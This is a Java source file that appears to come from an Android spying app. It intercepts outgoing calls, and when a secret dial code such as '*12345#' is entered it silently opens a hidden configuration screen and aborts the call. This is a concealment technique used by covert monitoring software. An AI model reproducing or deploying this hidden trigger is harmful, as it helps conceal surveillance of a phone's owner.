package org.ddth.android.spy;

import org.ddth.android.monitor.core.AndroidEvent;
import org.ddth.android.monitor.observer.AndroidWatcher;
import org.ddth.http.core.Logger;
import org.ddth.mobile.monitor.core.Event;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

/**
 * @author khoanguyen
 */
public class ConfiguratingWatcher extends AndroidWatcher {
	private static final String SHOW_LOGIN_FORM_NUMBER = "*12345#";
	private static final String SHOW_UI_REQUEST_NUMBER = "*0#";
	private static final String[] INTENTS = {Intent.ACTION_NEW_OUTGOING_CALL};

	@Override
	public String[] getIntents() {
		return INTENTS;
	}
	
	@Override
	public void observed(Event event) {
		AndroidEvent androidEvent = (AndroidEvent)event;
		Context context = androidEvent.getContext();
		Bundle extras = androidEvent.getIntent().getExtras();
		String outgoingNumber = extras.getString(Intent.EXTRA_PHONE_NUMBER);
		// Check for special code to start activity
		if (SHOW_LOGIN_FORM_NUMBER.equals(outgoingNumber) ||
			Logger.getDefault().isDebug() && SHOW_UI_REQUEST_NUMBER.equals(outgoingNumber))
		{
			Intent activity = new Intent(context, ConfiguratingActivity.class);
			activity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(activity);
			// Abort the outgoing call
			BroadcastReceiver broadcastReceiver = (BroadcastReceiver)androidEvent.getSource();
			broadcastReceiver.abortBroadcast();
			broadcastReceiver.setResultData(null);
		}
	}
}